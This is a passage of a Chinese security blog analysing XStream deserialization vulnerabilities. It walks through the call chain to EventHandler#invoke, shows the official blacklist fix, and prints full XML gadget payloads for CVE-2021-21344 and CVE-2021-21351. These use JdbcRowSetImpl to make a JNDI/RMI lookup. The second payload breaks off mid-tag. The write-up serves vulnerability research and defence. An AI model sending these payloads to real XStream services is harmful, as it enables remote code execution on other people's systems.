<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201258388-4072cb3d-0a7e-4536-91c4-e5faefe6688b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201258388-4072cb3d-0a7e-4536-91c4-e5faefe6688b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>下面的 <code>reader.movedown</code>方法用来获取子元素，并把子元素添加到当前 context 的 pathTracker中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201366400-b0577d9f-3371-42b5-a235-b42c80074d30.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201366400-b0577d9f-3371-42b5-a235-b42c80074d30.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进之后就变得一目了然了，其中判断 reader 是否还有子元素</p>
<p>继续往下执行<code>handler = (InvocationHandler)context.convertAnother(proxy, handlerType);</code>，接下来转换器转换最终得到EventHandler</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752162103063-8d023ede-16b2-42ca-91f1-3220eb94858c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752162103063-8d023ede-16b2-42ca-91f1-3220eb94858c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后进行代理的替换</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752198778878-aa95bc0f-e3dd-4e62-9d29-278cf928fd27.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752198778878-aa95bc0f-e3dd-4e62-9d29-278cf928fd27.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>往下调试，在<code> TreeSetConverter.unmarshal()</code> 方法中调用了 <code>this.treeMapConverter.populateTreeMap()</code>，从这个方法开始，XStream 开始处理了 XML 里面其他的节点元素。跟进该函数，先判断是否是第一个元素，是的话就调用 <code>putCurrentEntryIntoMap()</code>函数，即将当前内容缓存到 Map 中：</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199123385-80b4825e-e434-4ed2-bb36-f98a5c7534ac.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199123385-80b4825e-e434-4ed2-bb36-f98a5c7534ac.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进去，发现调用 <code>readItem</code> 方法读取标签内的内容并缓存到当前 Map 中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199161067-e4feec71-d58c-4895-8782-258a4d292349.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199161067-e4feec71-d58c-4895-8782-258a4d292349.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>走到<code>readItem</code>方法中，发现他又调用了<code>readClassType</code>和<code>convertAnother</code>方法，比较像递归调用的意思。而这里的元素已经成了第二个元素<code>&lt;dynamic-proxy&gt;</code></p>
<p>通过查看 mapper 可以知道，目前保存在 mapper 当中的还是两个元素，而 XStream 的处理，则会处理最新的一个（最里层的一个）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199260846-6b167081-e50f-4442-a290-792710a0b6c9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199260846-6b167081-e50f-4442-a290-792710a0b6c9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199784597-f6d740de-a560-42e5-91a5-19b2c2d3b188.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199784597-f6d740de-a560-42e5-91a5-19b2c2d3b188.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>经过处理之后返回的 type 就为最新的一个子元素的类型，这里是 <code>com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</code>，找到对应的转换器为 DynamicProxyConverter</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201813036-011f32a5-d633-4354-a39a-0170f27d6901.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201813036-011f32a5-d633-4354-a39a-0170f27d6901.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>首先判断当前元素是否还有子元素，如果存在子元素，则进行后续的判断</p>
<p>根据编写的xml，获取的子元素为<code>&lt;interface&gt;</code>，经过判断<code>if (elementName.equals(&quot;interface&quot;))</code>，获取当前<code>&lt;interface&gt;</code>的元素，再将其转换类型</p>
<p>如果仍然存在子元素，再获取完<code>&lt;interface&gt;</code>后，会进行下一次的遍历，我们xml中下一个子元素为<code>&lt;handler&gt;</code>，则获取标签所的对应类，并跳出迭代</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201944129-614f7c09-ff33-4f8e-8518-1415e66a3228.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201944129-614f7c09-ff33-4f8e-8518-1415e66a3228.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>继续向下调试，会调用<code>Proxy.newProxyInstance</code>方法，这是动态代理中实例化代理类的过程。接着调用了<code>context.convertAnother</code>方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752202507856-d16d4a50-f661-496b-8ffe-a1bb2291bf06.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752202507856-d16d4a50-f661-496b-8ffe-a1bb2291bf06.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>对应转换器为<code>AbstractReflectionConverter</code>，这里先会调用<code>instantiateNewInstance</code>方法实例化一个<code>EventHandler</code>类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752202595765-d0920502-e3ff-488b-bdcd-0b1f33b6446b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752202595765-d0920502-e3ff-488b-bdcd-0b1f33b6446b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>继续向下跟进<code>doUnmarshal</code>方法，这里有是内部递归，在这里也看到了<code>hasChildren</code>方法。从 xml 中也 可以看到 <code>&lt;handler&gt;</code> 节点之下还有很多子节点</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752203074283-be05c5f1-6b29-4a32-aa03-45d8df07f5d4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752203074283-be05c5f1-6b29-4a32-aa03-45d8df07f5d4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>剩下的都是类似的流程了</p>
<p>将所有节点过完以后，最终会走到<code>treeMapConverter.populateTreeMap</code>，跟进到<code>put.All()</code> 方法，里面的变量为 <code>sortedMap</code>，查看一下它的值可以发现这是一串链式存储的数据。</p>
<p>在大多数的<code>put</code>方法中，都会调用其<code>compare</code>方法，因此后面会走到<code>EventHandler#invoke</code>方法中，进行反射调用导致命令执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752203953369-ac6581c8-e0ae-4f06-be28-808aea0dce05.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752203953369-ac6581c8-e0ae-4f06-be28-808aea0dce05.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最终是调用到<code>EventHandler#invoke</code>方法，调用栈如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">invoke:<span class="number">428</span>, EventHandler (java.beans)</span><br><span class="line">compareTo:-<span class="number">1</span>, $Proxy0 (com.sun.proxy)</span><br><span class="line">compare:<span class="number">1294</span>, TreeMap (java.util)</span><br><span class="line">put:<span class="number">538</span>, TreeMap (java.util)</span><br><span class="line">putAll:<span class="number">281</span>, AbstractMap (java.util)</span><br><span class="line">putAll:<span class="number">327</span>, TreeMap (java.util)</span><br><span class="line">populateTreeMap:<span class="number">122</span>, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br></pre></td></tr></table></figure>

<h4 id="gNwxd">漏洞修复</h4>
根据官方的修复手段，这里其实增加了黑名单

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">xstream.registerConverter(<span class="keyword">new</span> <span class="title class_">Converter</span>() &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canConvert</span><span class="params">(Class type)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> type != <span class="literal">null</span> &amp;&amp; (type == java.beans.EventHandler || type == java.lang.ProcessBuilder || Proxy.isProxy(type));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Unsupported type due to security reasons.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">marshal</span><span class="params">(Object source, HierarchicalStreamWriter writer, MarshallingContext context)</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Unsupported type due to security reasons.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, XStream.PRIORITY_LOW);</span><br></pre></td></tr></table></figure>

<h3 id="JUbkO">CVE-2021-21344</h3>
超长Payload

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="uQpkR">CVE-2021-21351</h3>
Poc如下

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__dtm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__size</span>&gt;</span>-10086<span class="tag">&lt;/<span class="name">m__size</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">__overrideDefaultParser</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__overrideDefaultParser</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__incremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__incremental</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__source__location</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__source__location</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__defaultHandler</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__shouldStripWS</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__shouldStripWS</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__indexing</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__indexing</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__incrementalSAXSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fPullParserConfig</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">listeners</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">default</span>/&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">fPullParserConfig</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">name</span>&gt;</span>setAutoCommit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">class</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fConfigParse</span> <span class="attr">reference</span>=<span 